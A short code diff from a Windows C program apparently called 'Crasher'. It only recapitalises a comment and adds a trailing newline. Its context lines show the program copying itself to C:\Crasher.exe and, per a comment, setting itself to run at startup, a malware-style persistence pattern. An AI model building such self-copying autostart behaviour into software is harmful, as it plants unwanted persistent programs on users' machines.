@@ -81,7 +81,7 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 
 	if (GetFileAttributesW(L"C:\\Crasher.exe") == INVALID_FILE_ATTRIBUTES) {
 
-		// Copying the crasher to the C: drive
+		// Copying the Crasher to the C: drive
 		copy_file();
 
 		// Setting the Crasher to run on startup
@@ -115,3 +115,4 @@ int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 	
 	return 0;
 }
+
